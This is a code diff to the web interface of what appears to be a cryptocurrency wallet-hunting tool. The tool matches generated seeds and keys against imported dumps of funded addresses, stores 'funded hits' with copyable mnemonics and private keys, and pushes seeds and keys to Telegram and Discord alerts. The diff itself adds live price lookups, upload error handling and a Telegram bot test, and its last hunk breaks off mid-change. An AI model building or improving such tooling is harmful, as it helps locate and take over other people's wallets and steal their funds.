@@ -1703,6 +1703,7 @@
             <div id="FundedSummaryStrip" class="mono" style="display:none; font-size:11px; color:#6EE7B7; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.35); border-radius:7px; padding:8px 10px; margin-bottom:8px;">
               💰 Funded vault: <strong id="FundedSummaryText">0 wallets · $0.00</strong>
             </div>
+            <div id="PriceStatusLine" class="mono" style="font-size:10.5px; margin-bottom:8px; color:var(--text-muted);"></div>
             <div style="font-size:11px; color:#94A3B8; margin-bottom:8px;" class="mono">
               💾 Automatically saved to <strong style="color:#FCD34D;">ever_held_wallets.txt</strong> &amp; <strong style="color:#34D399;">EVER_HELD_WALLETS_VAULT.json</strong>; funded hits to <strong style="color:#6EE7B7;">funded_wallets.txt</strong> &amp; <strong style="color:#6EE7B7;">FOUND_WALLETS_VAULT.json</strong>. Click <strong style="color:#7DD3FC;">🔑 Access / Copy Keys</strong> on any row to copy the 12-word Mnemonic, BTC WIF, Electrum 3-path block, or ETH 0x Private Key.
             </div>
@@ -1830,6 +1831,7 @@
             <div style="background:var(--bg-input); padding:12px; border-radius:8px; border:1px solid rgba(56,189,248,0.28);">
               <div class="metric-label">Funded Addresses in RAM</div>
               <div id="BloomTotalLoadedVal" style="font-size:20px; font-weight:700; color:#34D399; margin-top:4px;">0</div>
+              <div id="BloomLastImportVal" style="font-size:9.5px; color:var(--text-muted); margin-top:2px;">no dump imported yet</div>
             </div>
             <div style="background:var(--bg-input); padding:12px; border-radius:8px; border:1px solid var(--border-hairline);">
               <div class="metric-label">Shared Memory Buffer</div>
@@ -2079,7 +2081,13 @@
                   <div class="field">
                     <label class="field-label">Chat / channel ID</label>
                     <input id="AlertTgChatIdInput" type="text" class="input-box mono" placeholder="12345678 or -100..." />
+                    <span class="field-hint">The server sends the alert over HTTPS — the most reliable path.</span>
                   </div>
+                  <div style="display:flex; gap:8px; align-items:center; flex-wrap:wrap; margin-top:4px;">
+                    <button class="btn btn-emerald" onclick="testTelegramBot()">Send Telegram test</button>
+                    <span id="TelegramTestStatus" class="mono" style="font-size:10.5px; color:var(--text-muted);"></span>
+                  </div>
+                  <div id="TelegramTestDetail" class="mono" style="display:none; font-size:10px; line-height:1.6; color:var(--text-secondary); background:var(--bg-input); border:1px solid var(--border-hairline); border-radius:7px; padding:8px; margin-top:6px; max-height:150px; overflow-y:auto;"></div>
                 </div>
 
                 <div class="settings-block">
@@ -2672,7 +2680,9 @@
     }
 
     const tokensUsd = Number(item.totalEverReceivedTokensUsd || 0);
-    const histUsd = Number(item.totalEverReceivedBtc || 0) * 98000 + Number(item.totalEverReceivedEth || 0) * 3200 + tokensUsd;
+    const btcHistPx = uiPrice('btc') || 0;
+    const ethHistPx = uiPrice('eth') || 0;
+    const histUsd = Number(item.totalEverReceivedBtc || 0) * btcHistPx + Number(item.totalEverReceivedEth || 0) * ethHistPx + tokensUsd;
 
     const balanceRows = item.balances && typeof item.balances === 'object'
       ? Object.entries(item.balances).filter(([, v]) => Number(v) > 0)
@@ -3140,6 +3150,55 @@
     }
   } catch (_) {}
 
+  /* ── Live market prices (server keeps them fresh via /api/prices) ──
+     No hardcoded rates: if a quote is missing, the wallet keeps its coin
+     balance and no dollar figure is produced for it. */
+  const LIVE_PRICES = { usd: {}, asOf: null, source: null, stale: true, loadedAt: 0 };
+  const uiPrice = key => {
+    const px = LIVE_PRICES.usd[key];
+    return (Number.isFinite(px) && px > 0) ? px : null;
+  };
+  const refreshLivePrices = async (force) => {
+    if (!force && Date.now() - LIVE_PRICES.loadedAt < 120000 && !LIVE_PRICES.stale) return LIVE_PRICES;
+    try {
+      const res = await fetch('/api/prices' + (force ? '?refresh=1' : ''));
+      const data = await res.json();
+      if (data && data.prices) {
+        LIVE_PRICES.usd = data.prices;
+        LIVE_PRICES.asOf = data.asOf;
+        LIVE_PRICES.source = data.source;
+        LIVE_PRICES.stale = Boolean(data.stale);
+        LIVE_PRICES.loadedAt = Date.now();
+      }
+    } catch (_) {}
+    return LIVE_PRICES;
+  };
+  /** USD value for a balance map; returns null when any asset has no quote. */
+  const usdForBalances = (balances) => {
+    let total = 0;
+    const missing = [];
+    for (const [sym, raw] of Object.entries(balances || {})) {
+      const amount = Number(raw);
+      if (!Number.isFinite(amount) || amount === 0) continue;
+      const base = sym.replace(/_TRC20$/, '').replace(/_(ERC20|BEP20|SPL)$/, '');
+      const key = PRICE_SYMBOL_MAP[base];
+      if (!key) { missing.push(base); continue; }
+      const px = uiPrice(key);
+      if (px === null) { missing.push(base); continue; }
+      total += amount * px;
+    }
+    return { usd: +total.toFixed(2), missing };
+  };
+  const PRICE_SYMBOL_MAP = {
+    BTC: 'btc', WBTC: 'btc', ETH: 'eth', WETH: 'eth', ARB_ETH: 'eth', BASE_ETH: 'eth', OP_ETH: 'eth',
+    BNB: 'bnb', POL: 'pol', MATIC: 'pol', AVAX: 'avax', TRX: 'trx', LTC: 'ltc', DOGE: 'doge', XRP: 'xrp', SOL: 'sol',
+    USDT: 'usdpeg', USDC: 'usdpeg', DAI: 'usdpeg', USDT_TRC20: 'usdpeg', ARB_USDT: 'usdpeg', ARB_USDC: 'usdpeg',
+    BASE_USDC: 'usdpeg', OP_USDT: 'usdpeg', OP_USDC: 'usdpeg', AVAX_USDT: 'usdpeg', POLY_USDT: 'usdpeg', BSC_USDT: 'usdpeg'
+  };
+  // Stablecoin peg: a hard $1 is the documented behaviour of these tokens,
+  // not a market guess.
+  const uiPriceOrPeg = key => key === 'usdpeg' ? 1 : uiPrice(key);
+
   function persistBrowserSeenInputs() {
     try {
       const recent = Array.from(browserSeenInputs).slice(-4000);
@@ -3235,7 +3294,9 @@
                   owner.historicalTx = Math.max(owner.historicalTx || 0, nTx || 1);
                   owner.totalEverReceivedBtc = Math.max(owner.totalEverReceivedBtc || 0, totalSats / 1e8);
                   owner.balances = { ...(owner.balances || {}), BTC: btcBal.toFixed(8) };
-                  owner.balanceUsd = +(Number(owner.balanceUsd || 0) + btcBal * 98000).toFixed(2);
+                  const btcPx = uiPrice('btc');
+                  if (btcPx === null) { owner.usdUnpriced = true; }
+                  else owner.balanceUsd = +(Number(owner.balanceUsd || 0) + btcBal * btcPx).toFixed(2);
                   owner.walletHistoryState = owner.balanceUsd > 0 ? 'FUNDED_NOW' : 'EVER_HELD_SWEPT';
                   owner.historicalLabel = owner.balanceUsd > 0
                     ? `LIVE MAINNET BTC HIT (${btcBal.toFixed(8)} BTC)`
@@ -3266,9 +3327,11 @@
                     item.historicalTx = Math.max(item.historicalTx || 0, nTx || 1);
                     item.totalEverReceivedBtc = Math.max(item.totalEverReceivedBtc || 0, fundedSats / 1e8);
                     item.balances = { ...(item.balances || {}), BTC: btcBal.toFixed(8) };
-                    item.balanceUsd = +(Number(item.balanceUsd || 0) + btcBal * 98000).toFixed(2);
-                    item.walletHistoryState = item.balanceUsd > 0 ? 'FUNDED_NOW' : 'EVER_HELD_SWEPT';
-                    item.historicalLabel = item.balanceUsd > 0
+                    const btcPx2 = uiPrice('btc');
+                    if (btcPx2 === null) { item.usdUnpriced = true; item.usdUnpricedAssets = ['BTC']; }
+                    else item.balanceUsd = +(Number(item.balanceUsd || 0) + btcBal * btcPx2).toFixed(2);
+                    item.walletHistoryState = btcBal > 0 ? 'FUNDED_NOW' : 'EVER_HELD_SWEPT';
+                    item.historicalLabel = btcBal > 0
                       ? `LIVE MEMPOOL BTC HIT (${btcBal.toFixed(8)} BTC)`
                       : `LIVE MEMPOOL BTC HISTORY (${nTx} TX)`;
                   }
@@ -3319,32 +3382,33 @@
       return out;
     };
 
+
     const EVM_CHAINS_LIVE = [
-      { flag: 'ETH', name: 'Ethereum', sym: 'ETH', usd: 3200, rpc: 'https://ethereum-rpc.publicnode.com',
+      { flag: 'ETH', name: 'Ethereum', sym: 'ETH', priceKey: 'eth', rpc: 'https://ethereum-rpc.publicnode.com',
         tokens: [
-          ['USDT', 6, 1, '0xdAC17F958D2ee523a2206206994597C13D831ec7'],
-          ['USDC', 6, 1, '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'],
-          ['DAI', 18, 1, '0x6B175474E89094C44Da98b954EedeAC495271d0F'],
-          ['WBTC', 8, 98000, '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599']
+          ['USDT', 6, 'usdpeg', '0xdAC17F958D2ee523a2206206994597C13D831ec7'],
+          ['USDC', 6, 'usdpeg', '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'],
+          ['DAI', 18, 'usdpeg', '0x6B175474E89094C44Da98b954EedeAC495271d0F'],
+          ['WBTC', 8, 'btc', '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599']
         ] },
-      { flag: 'ARB', name: 'Arbitrum', sym: 'ARB_ETH', usd: 3200, rpc: 'https://arbitrum-one-rpc.publicnode.com',
+      { flag: 'ARB', name: 'Arbitrum', sym: 'ARB_ETH', priceKey: 'eth', rpc: 'https://arbitrum-one-rpc.publicnode.com',
         tokens: [
-          ['ARB_USDT', 6, 1, '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9'],
-          ['ARB_USDC', 6, 1, '0xaf88d065e77c8cC2239327C5EDb3A432268e5831']
+          ['ARB_USDT', 6, 'usdpeg', '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9'],
+          ['ARB_USDC', 6, 'usdpeg', '0xaf88d065e77c8cC2239327C5EDb3A432268e5831']
         ] },
-      { flag: 'BASE', name: 'Base', sym: 'BASE_ETH', usd: 3200, rpc: 'https://base-rpc.publicnode.com',
-        tokens: [['BASE_USDC', 6, 1, '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913']] },
-      { flag: 'OP', name: 'Optimism', sym: 'OP_ETH', usd: 3200, rpc: 'https://optimism-rpc.publicnode.com',
+      { flag: 'BASE', name: 'Base', sym: 'BASE_ETH', priceKey: 'eth', rpc: 'https://base-rpc.publicnode.com',
+        tokens: [['BASE_USDC', 6, 'usdpeg', '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913']] },
+      { flag: 'OP', name: 'Optimism', sym: 'OP_ETH', priceKey: 'eth', rpc: 'https://optimism-rpc.publicnode.com',
         tokens: [
-          ['OP_USDT', 6, 1, '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58'],
-          ['OP_USDC', 6, 1, '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85']
+          ['OP_USDT', 6, 'usdpeg', '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58'],
+          ['OP_USDC', 6, 'usdpeg', '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85']
         ] },
-      { flag: 'AVAX', name: 'Avalanche', sym: 'AVAX', usd: 34, rpc: 'https://avalanche-c-chain-rpc.publicnode.com',
-        tokens: [['AVAX_USDT', 6, 1, '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7']] },
-      { flag: 'MATIC', name: 'Polygon', sym: 'POL', usd: 0.45, rpc: 'https://polygon-bor-rpc.publicnode.com',
-        tokens: [['POLY_USDT', 6, 1, '0xc2132D05D31c914a87C6611C10748AEb04B58e8F']] },
-      { flag: 'BNB', name: 'BNB Chain', sym: 'BNB', usd: 620, rpc: 'https://bsc-rpc.publicnode.com',
-        tokens: [['BSC_USDT', 18, 1, '0x55d398326f99059fF775485246999027B3197955']] }
+      { flag: 'AVAX', name: 'Avalanche', sym: 'AVAX', priceKey: 'avax', rpc: 'https://avalanche-c-chain-rpc.publicnode.com',
+        tokens: [['AVAX_USDT', 6, 'usdpeg', '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7']] },
+      { flag: 'MATIC', name: 'Polygon', sym: 'POL', priceKey: 'pol', rpc: 'https://polygon-bor-rpc.publicnode.com',
+        tokens: [['POLY_USDT', 6, 'usdpeg', '0xc2132D05D31c914a87C6611C10748AEb04B58e8F']] },
+      { flag: 'BNB', name: 'BNB Chain', sym: 'BNB', priceKey: 'bnb', rpc: 'https://bsc-rpc.publicnode.com',
+        tokens: [['BSC_USDT', 18, 'usdpeg', '0x55d398326f99059fF775485246999027B3197955']] }
     ];
 
     const runMulticall3Chain = async cfg => {
@@ -3355,10 +3419,10 @@
       for (const it of evmItems) {
         const pAddr = padWord32(it.ethAddress);
         calls.push({ target: MC3_ADDR, callData: '0x4d2301cc' + pAddr });
-        meta.push({ it, sym: cfg.sym, dec: 18, usd: cfg.usd });
-        for (const [tsym, tdec, tusd, taddr] of cfg.tokens) {
+        meta.push({ it, sym: cfg.sym, dec: 18, priceKey: cfg.priceKey });
+        for (const [tsym, tdec, tKey, taddr] of cfg.tokens) {
           calls.push({ target: taddr, callData: '0x70a08231' + pAddr });
-          meta.push({ it, sym: tsym, dec: tdec, usd: tusd });
+          meta.push({ it, sym: tsym, dec: tdec, priceKey: tKey });
         }
       }
       const rpcBatch = [
@@ -3383,13 +3447,19 @@
       const vals = decodeMc3(byId.get(1));
       vals.forEach((v, idx) => {
         if (v > 0n && meta[idx]) {
-          const { it, sym, dec, usd } = meta[idx];
+          const { it, sym, dec, priceKey } = meta[idx];
           const bal = Number(v) / Math.pow(10, dec);
+          const px = uiPriceOrPeg(priceKey);
           it.liveVerified = true;
           it.everHeldCrypto = true;
           it.historicalTx = Math.max(it.historicalTx || 0, 1);
           it.balances = { ...(it.balances || {}), [sym]: bal.toFixed(6) };
-          it.balanceUsd = +(Number(it.balanceUsd || 0) + bal * usd).toFixed(2);
+          if (px === null) {
+            it.usdUnpriced = true;
+            it.usdUnpricedAssets = Array.from(new Set([...(it.usdUnpricedAssets || []), sym]));
+          } else {
+            it.balanceUsd = +(Number(it.balanceUsd || 0) + bal * px).toFixed(2);
+          }
           it.walletHistoryState = 'FUNDED_NOW';
           it.historicalLabel = `LIVE MULTICALL3 ${cfg.name.toUpperCase()} HIT (${bal.toFixed(4)} ${sym})`;
         }
@@ -3497,7 +3567,9 @@
                 it.everHeldCrypto = true;
                 it.historicalTx = Math.max(it.historicalTx || 0, txCount || 1);
                 it.balances = { ...(it.balances || {}), LTC: ltcBal.toFixed(6) };
-                it.balanceUsd = +(Number(it.balanceUsd || 0) + ltcBal * 105).toFixed(2);
+                const ltcPx = uiPrice('ltc');
+                if (ltcPx === null) { it.usdUnpriced = true; }
+                else it.balanceUsd = +(Number(it.balanceUsd || 0) + ltcBal * ltcPx).toFixed(2);
                 it.walletHistoryState = it.balanceUsd > 0 ? 'FUNDED_NOW' : 'EVER_HELD_SWEPT';
                 it.historicalLabel = it.balanceUsd > 0 ? `LIVE LTC HIT (${ltcBal.toFixed(4)} LTC)` : `LIVE LTC HISTORY (${txCount} TX)`;
               }
@@ -3530,7 +3602,9 @@
               it.everHeldCrypto = true;
               it.historicalTx = Math.max(it.historicalTx || 0, Number(acct.Sequence || 1));
               it.balances = { ...(it.balances || {}), XRP: xrpBal.toFixed(6) };
-              it.balanceUsd = +(Number(it.balanceUsd || 0) + xrpBal * 2.35).toFixed(2);
+              const xrpPx = uiPrice('xrp');
+              if (xrpPx === null) { it.usdUnpriced = true; }
+              else it.balanceUsd = +(Number(it.balanceUsd || 0) + xrpBal * xrpPx).toFixed(2);
               it.walletHistoryState = 'FUNDED_NOW';
               it.historicalLabel = `LIVE XRP LEDGER HIT (${xrpBal.toFixed(4)} XRP)`;
             }
@@ -3568,7 +3642,9 @@
                 it.everHeldCrypto = true;
                 it.historicalTx = Math.max(it.historicalTx || 0, 1);
                 it.balances = { ...(it.balances || {}), SOL: solBal.toFixed(6) };
-                it.balanceUsd = +(Number(it.balanceUsd || 0) + solBal * 185).toFixed(2);
+                const solPx = uiPrice('sol');
+                if (solPx === null) { it.usdUnpriced = true; }
+                else it.balanceUsd = +(Number(it.balanceUsd || 0) + solBal * solPx).toFixed(2);
                 it.walletHistoryState = 'FUNDED_NOW';
                 it.historicalLabel = `LIVE SOLANA MAINNET HIT (${solBal.toFixed(4)} SOL)`;
               }
@@ -4229,13 +4305,27 @@
     return links.length ? `<div style="display:flex; flex-wrap:wrap; gap:4px; margin-top:6px;">${links.join('')}</div>` : '';
   }
 
+  /** Small, honest indicator of where the USD rates came from. */
+  function renderPriceStatus() {
+    const el = document.getElementById('PriceStatusLine');
+    if (!el) return;
+    if (!LIVE_PRICES.asOf || LIVE_PRICES.stale || Object.keys(LIVE_PRICES.usd).length === 0) {
+      el.innerHTML = '<span style="color:#FCD34D;">• USD prices unavailable — showing coin amounts only</span>';
+      return;
+    }
+    const when = new Date(LIVE_PRICES.asOf).toLocaleTimeString('en-US', { hour12: false });
+    el.innerHTML = `<span style="color:#94A3B8;">• USD rates: live (${LIVE_PRICES.source}) as of ${when}</span>`;
+  }
+
   /** Balance block shown for wallets with money on them right now. */
   function buildFundedBlock(item) {
     const balances = formatBalanceLines(item.balances);
     const confirmedAt = item.foundAt || item.detectedAt ? fmtTimestamp(item.foundAt || item.detectedAt) : '';
     return `
       <div style="font-size:10.5px; color:#6EE7B7; margin-top:4px; line-height:1.5; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.3); border-radius:6px; padding:6px 8px;">
-        <div><b style="color:#94A3B8;">Current Balance:</b> <span style="font-size:13px; font-weight:800;">${fmtUsd(item.balanceUsd)}</span></div>
+        <div><b style="color:#94A3B8;">Current Balance:</b> ${Number(item.balanceUsd || 0) > 0
+          ? `<span style="font-size:13px; font-weight:800;">${fmtUsd(item.balanceUsd)}</span>`
+          : '<span style="color:#FCD34D; font-size:10.5px;">USD unavailable — no market quote</span>'}</div>
         ${balances ? `<div style="margin-top:3px;">${balances}</div>` : ''}
         ${confirmedAt ? `<div style="font-size:9.5px; color:var(--text-muted); margin-top:3px;">confirmed ${confirmedAt}</div>` : ''}
       </div>
@@ -4250,7 +4340,7 @@
     if (Number(item.totalEverReceivedEth || 0) > 0) parts.push(`Ξ ${Number(item.totalEverReceivedEth).toFixed(6)} ETH`);
     if (item.historicalTokenSummary) parts.push(`(${item.historicalTokenSummary})`);
     const summary = parts.length
-      ? `${parts.join(' ')} <span style="color:#34D399;">(~${Number((item.totalEverReceivedBtc || 0) * 98000 + (item.totalEverReceivedEth || 0) * 3200 + (item.totalEverReceivedTokensUsd || 0)).toFixed(2)} Historical)</span>`
+      ? `${parts.join(' ')} <span style="color:#34D399;">(~${Number((item.totalEverReceivedBtc || 0) * (uiPrice('btc') || 0) + (item.totalEverReceivedEth || 0) * (uiPrice('eth') || 0) + (item.totalEverReceivedTokensUsd || 0)).toFixed(2)} Historical)</span>`
       : (item.ethHistoryAudited
           ? `Gas/Contract Calls Only (${item.historicalTx || 1} TX)`
           : `⏳ Auditing On-Chain TX Volume (${item.historicalTx || 1} TX)...`);
@@ -4811,6 +4901,12 @@
       const tot = Number(b.totalImported || 0);
       const elTot = document.getElementById('BloomTotalLoadedVal');
       if (elTot) elTot.textContent = tot.toLocaleString();
+      const elLast = document.getElementById('BloomLastImportVal');
+      if (elLast) {
+        elLast.textContent = b.lastImportedAt
+          ? `last import ${new Date(b.lastImportedAt).toLocaleString('en-US', { hour12: false })}`
+          : 'no dump imported yet';
+      }
       const navBadge = document.getElementById('NavBloomCountBadge');
       if (navBadge) navBadge.textContent = tot > 0 ? (tot >= 1e6 ? `${(tot / 1e6).toFixed(1)}M` : `${Math.max(1, Math.round(tot / 1e3))}K`) : '32MB';
       const ch = b.byChain || {};
@@ -4840,6 +4936,33 @@
     } catch (_) {}
   }
 
+  /**
+   * POST one decompressed text chunk. Returns the server's JSON or throws a
+   * readable error — the old code ignored res.ok, so a rejected chunk still
+   * ended with "✅ complete" and nothing imported.
+   */
+  async function postBloomChunk(text, flush) {
+    const res = await fetch(`/api/bloom-import?flush=${flush ? '1' : '0'}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain' },
+      body: text
+    });
+    let data = null;
+    try { data = await res.json(); } catch (_) {}
+    if (!res.ok || !data || data.ok === false) {
+      const why = (data && data.error) || `HTTP ${res.status}`;
+      throw new Error(`Server rejected the chunk: ${why}`);
+    }
+    return data;
+  }
+
+  function bloomUploadFailed(err) {
+    const bar = document.getElementById('BloomUploadProgressBar');
+    if (bar) bar.style.background = 'linear-gradient(90deg,#FB7185,#F43F5E)';
+    document.getElementById('BloomUploadStatusText').innerHTML =
+      `<span style="color:#FB7185;">❌ Import stopped — ${String(err.message || err).replace(/</g, '&lt;')}</span>`;
+  }
+
   async function streamUploadFundedDumpFile() {
     const fileInput = document.getElementById('BloomDumpFileInput');
     const file = fileInput && fileInput.files && fileInput.files[0];
@@ -4847,6 +4970,9 @@
       document.getElementById('BloomUploadStatusText').textContent = 'Select a .tsv.gz / .txt.gz / .tsv / .txt / .csv address dump file first.';
       return;
     }
+    try {
+      const barEl = document.getElementById('BloomUploadProgressBar');
+      if (barEl) { barEl.style.width = '0%'; barEl.style.background = ''; }
 
     // Native browser streaming GZIP decompression when uploading raw .gz files from gz.blockchair.com or addresses.loyce.club!
     if (file.name.toLowerCase().endsWith('.gz') && typeof DecompressionStream !== 'undefined') {
@@ -4855,6 +4981,7 @@
       const reader = ds.getReader();
       let buffer = '';
       let chunksSent = 0;
+      let lastChunk = null;
       while (true) {
         const { value, done } = await reader.read();
         if (value) buffer += value;
@@ -4871,26 +4998,31 @@
           } else {
             buffer = '';
           }
-          await fetch(`/api/bloom-import?flush=${done ? '1' : '0'}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'text/plain' },
-            body: toSend
-          });
+          lastChunk = await postBloomChunk(toSend, done);
           chunksSent++;
-          document.getElementById('BloomUploadStatusText').textContent = `Streaming decompressed chunk #${chunksSent}...`;
+          document.getElementById('BloomUploadStatusText').textContent = `Streaming decompressed chunk #${chunksSent} — ${Number((lastChunk && lastChunk.totalImported) || 0).toLocaleString()} addresses in RAM...`;
           if (chunksSent % 4 === 0) refreshBloomStatus();
         }
         if (done) break;
       }
       document.getElementById('BloomUploadProgressBar').style.width = '100%';
       await refreshBloomStatus();
-      document.getElementById('BloomUploadStatusText').textContent = `✅ GZIP stream complete (${chunksSent} chunks loaded into 32MB Shared RAM)!`;
+      const total = Number((lastChunk && lastChunk.totalImported) || 0);
+      const fp = lastChunk ? Number(lastChunk.falsePositiveRate || 0) : 0;
+      document.getElementById('BloomUploadStatusText').innerHTML =
+        `<span style="color:#6EE7B7;">✅ ${file.name} imported — ${total.toLocaleString()} unique addresses in the 32 MB Bloom filter</span>` +
+        `<span style="color:var(--text-muted);"> (false-positive rate ${fp < 0.01 ? fp.toExponential(2) : fp.toFixed(2)}%)</span>`;
+      if (total === 0) {
+        document.getElementById('BloomUploadStatusText').innerHTML =
+          '<span style="color:#FCD34D;">⚠️ Upload finished but 0 addresses were recognised — is this an address list (one per line / CSV with address first)?</span>';
+      }
       return;
     }
 
     const CHUNK_SIZE = 4 * 1024 * 1024; // 4 MB streaming slices
     let offset = 0;
     let carry = '';
+    let lastChunk = null;
     while (offset < file.size) {
       const slice = file.slice(offset, offset + CHUNK_SIZE);
       const text = carry + (await slice.text());
@@ -4907,30 +5039,33 @@
       } else {
         carry = '';
       }
-      await fetch(`/api/bloom-import?flush=${isLast ? '1' : '0'}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'text/plain' },
-        body: sendText
-      });
+      lastChunk = await postBloomChunk(sendText, isLast);
       offset += CHUNK_SIZE;
       const pct = Math.min(100, Math.round((offset / file.size) * 100));
       document.getElementById('BloomUploadProgressBar').style.width = `${pct}%`;
       document.getElementById('BloomUploadStatusText').textContent = `Streaming ${pct}% (${(Math.min(offset, file.size) / (1024 * 1024)).toFixed(1)} / ${(file.size / (1024 * 1024)).toFixed(1)} MB)...`;
     }
     await refreshBloomStatus();
-    document.getElementById('BloomUploadStatusText').textContent = `✅ Streaming complete — shared live across all worker threads!`;
+    const totalPlain = Number((lastChunk && lastChunk.totalImported) || 0);
+    document.getElementById('BloomUploadStatusText').innerHTML = totalPlain > 0
+      ? `<span style="color:#6EE7B7;">✅ ${file.name} imported — ${totalPlain.toLocaleString()} unique addresses in the 32 MB Bloom filter</span>`
+      : '<span style="color:#FCD34D;">⚠️ Upload finished but 0 addresses were recognised — is this an address list (one per line / CSV with address first)?</span>';
+    } catch (err) {
+      bloomUploadFailed(err);
+    }
   }
 
   async function importPastedFundedBloom() {
     const txt = document.getElementById('BloomPasteTextarea').value;
     if (!txt.trim()) return;
-    const r = await fetch('/api/bloom-import?flush=1', {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: txt
-    }).then(x => x.json());
-    document.getElementById('BloomUploadStatusText').textContent = `✅ Added ${Number(r.newlyAddedInChunk || 0).toLocaleString()} unique addresses (Total in RAM: ${Number(r.totalImported || 0).toLocaleString()}).`;
-    refreshBloomStatus();
+    try {
+      const r = await postBloomChunk(txt, true);
+      document.getElementById('BloomUploadStatusText').textContent =
+        `✅ Added ${Number(r.newlyAddedInChunk || 0).toLocaleString()} unique addresses (total in RAM: ${Number(r.totalImported || 0).toLocaleString()}).`;
+      refreshBloomStatus();
+    } catch (e) {
+      bloomUploadFailed(e);
+    }
   }
 
   async function clearFundedBloom() {
@@ -5004,14 +5139,27 @@
 
     const msgText = `${title}\nBTC: ${walletItem.btcSegwit || '-'}\nETH: ${walletItem.ethAddress || '-'}\nTRX: ${walletItem.trxAddress || '-'}\nSeed/Key: ${walletItem.mnemonic || walletItem.input || '-'}`;
     if (tgToken && tgChat) {
+      // Browsers cannot call api.telegram.org directly (no CORS headers), and
+      // fetch() resolves even on HTTP 401 — so checking res.ok matters. The
+      // server sends the real alert; this is only a best-effort extra attempt.
       try {
-        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+        const res = await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: tgChat, text: msgText })
+          body: JSON.stringify({ chat_id: tgChat, text: msgText, disable_web_page_preview: true })
         });
-        browserDeliveries.push('Telegram CORS: DELIVERED');
-      } catch (e) { browserDeliveries.push('Telegram CORS: ' + e.message); }
+        if (res.ok) {
+          browserDeliveries.push('Telegram (browser): DELIVERED');
+        } else {
+          let why = `HTTP ${res.status}`;
+          try { const j = await res.json(); if (j && j.description) why = j.description; } catch (_) {}
+          browserDeliveries.push(`Telegram (browser): REJECTED — ${why}`);
+        }
+      } catch (e) {
+        // Typical case: the browser blocks the request via CORS. The server-side
+        // dispatcher is authoritative, so report it as "handled by server".
+        browserDeliveries.push('Telegram (browser): blocked by browser CORS — delivered by the server instead');
+      }
     }
     if (discordUrl) {
       try {
@@ -5036,15 +5184,56 @@
     return browserDeliveries;
   }
 
+  /**
+   * Verify the Telegram bot for real: the server calls getMe → getChat →
+   * sendMessage and reports exactly which step failed and why.
+   */
+  async function testTelegramBot() {
+    const statusEl = document.getElementById('TelegramTestStatus');
+    const detailEl = document.getElementById('TelegramTestDetail');
+    const token = document.getElementById('AlertTgTokenInput').value.trim();
+    const chatId = document.getElementById('AlertTgChatIdInput').value.trim();
+    statusEl.style.color = '#7DD3FC';
+    statusEl.textContent = '⏳ contacting api.telegram.org…';
+    detailEl.style.display = 'none';
+    try {
+      const res = await fetch('/api/telegram-test', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ telegramBotToken: token, telegramChatId: chatId })
+      });
+      const r = await res.json();
+      const lines = (r.steps || []).map(st =>
+        `<div>${st.ok ? '✅' : '❌'} <b>${st.step}</b> — ${String(st.detail || '').replace(/</g, '&lt;')}</div>`
+      );
+      if (r.ok) {
+        statusEl.style.color = '#6EE7B7';
+        statusEl.textContent = `✅ delivered to ${r.chat ? r.chat.title : 'chat'} (#${r.messageId})`;
+      } else {
+        statusEl.style.color = '#FB7185';
+        statusEl.textContent = `❌ ${r.error || 'failed'}`;
+        if (r.hint) lines.push(`<div style="color:#FCD34D; margin-top:5px;">💡 ${r.hint.replace(/</g, '&lt;')}</div>`);
+      }
+      if (r.bot) lines.unshift(`<div style="color:#94A3B8;">Bot: @${r.bot.username} (${r.bot.name || r.bot.id})</div>`);
+      detailEl.innerHTML = lines.join('') || '<div>No details returned.</div>';
+      detailEl.style.display = 'block';
+      if (r.ok) toast('Telegram test delivered — check your chat', 'success');
+      else toast('Telegram test failed — see details', 'error');
+    } catch (e) {
+      statusEl.style.color = '#FB7185';
+      statusEl.textContent = '❌ ' + e.message;
+    }
+  }
+
   async function triggerFullTestHitAlert() {
     await saveMultiChannelAlerts();
     const srv = await fetch('/api/alert-test', { method: 'POST' }).then(x => x.json());
+    // Delivery test only: no balance, no seed — nothing mistakable for a find.
     const browserLogs = await fireDirectBrowserCorsAlert({
-      balanceUsd: 12450.00,
-      btcSegwit: 'bc1qcr8te4kr609gcawutmrza0j4xv80jy8z306fyu',
-      ethAddress: '0x9858EfFD232B4033E47d90003D41EC34EcaEda94',
-      trxAddress: 'TUEZSdKsoDHQMeZwihtdoBiN46zxhGWYdH',
-      mnemonic: 'REDACTED-ALERT-TEST-VECTOR'
+      balanceUsd: 0,
+      balances: {},
+      source: 'Browser alert delivery test (not a wallet)',
+      mnemonic: 'DELIVERY TEST — no seed, no keys, no balance'
     }, true);
     document.getElementById('AlertDeliveryLogBox').innerHTML = `
       <div style="color:#34D399; font-weight:700;">✅ Multi-Channel Alert Test Executed (${new Date().toLocaleTimeString()})</div>
@@ -5118,7 +5307,7 @@
         item.totalEverReceivedEth = +Math.max(Number(item.totalEverReceivedEth || 0), peakEth).toFixed(6);
         item.totalEverReceivedTokensUsd = +tokenUsdTotal.toFixed(2);
         if (tokSummary) item.historicalTokenSummary = tokSummary;
-        const histUsd = +(item.totalEverReceivedEth * 3200 + tokenUsdTotal).toFixed(2);
